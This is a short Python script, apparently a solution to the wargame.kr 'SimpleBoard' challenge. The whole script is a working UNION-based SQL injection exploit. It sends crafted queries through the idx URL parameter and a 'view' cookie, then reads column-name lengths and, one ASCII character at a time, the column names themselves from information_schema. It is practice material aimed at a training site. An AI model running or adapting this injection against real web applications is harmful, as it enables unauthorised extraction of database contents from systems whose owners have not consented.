from requests import *
s=session()
def name(leng, num):
    result=''
    for i in range(1,leng+1):
        query=f'0 union select 1,2,3,ascii(substr(column_name,{i},1)) from information_schema.columns where table_schema=database() limit {num},1'
        cookies={'view':f'/{query}'}
        url=f'http://wargame.kr:8080/SimpleBoard/read.php?idx={query}'
        response=get(url=url,cookies=cookies)
        response=response.text.split('<td colspan=3>')
        response=response[1].split('<')
        result+=chr(int(response[0]))
    print('column_name:',result)
for i in range(30):
    query=f'0 union select 1,2,3,length(column_name) from information_schema.columns where table_schema=database() limit {i},1'
    cookies={'view':f'/{query}'}
    url=f'http://wargame.kr:8080/SimpleBoard/read.php?idx={query}'
    response=get(url=url,cookies=cookies)
    response=response.text.split('<td colspan=3>')
    response=response[1].split('<')
    if response[0] == '':
        break
    print('column name length :',response[0])
    name(int(response[0]),i)